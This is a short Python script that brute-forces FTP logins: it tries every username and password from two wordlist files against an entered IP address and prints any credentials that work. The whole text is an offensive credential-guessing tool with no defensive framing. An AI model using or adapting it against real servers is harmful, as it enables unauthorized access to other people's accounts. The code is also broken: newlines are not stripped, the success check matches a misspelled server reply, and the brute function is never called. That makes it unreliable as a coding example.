import ftplib
import sys


def brute(ip,users_file,passwords_file):
    try:
        ud = open(users_file, "r")
        pd = open(passwords_file, "r")

        users = ud.readlines()
        passwords = pd.readlines()

        for user in  users :
            for password  in passwords :
                try:
                    print ("[*] Trying to connect")
                    conect = ftplib.FTP(ip)
                    answer = conect.login(user,password)
                    if answer == ("230 Login sucessfull."):
                        print("[*]Successful atack")
                        print("User:", user)
                        print("Password:", password)
                        sys.exit()

                except ftplib.error_perm:
                    print("Can´t Brute Force with user:" + user +  "and password:" + password)
                    

    except(KeyboardInterrupt):
        print("Interrupted. Later!!")
        sys.exit()


ip = input("IP:")
users_file = ("users.txt")
passwords_file = ("passwords.txt")
            
                    

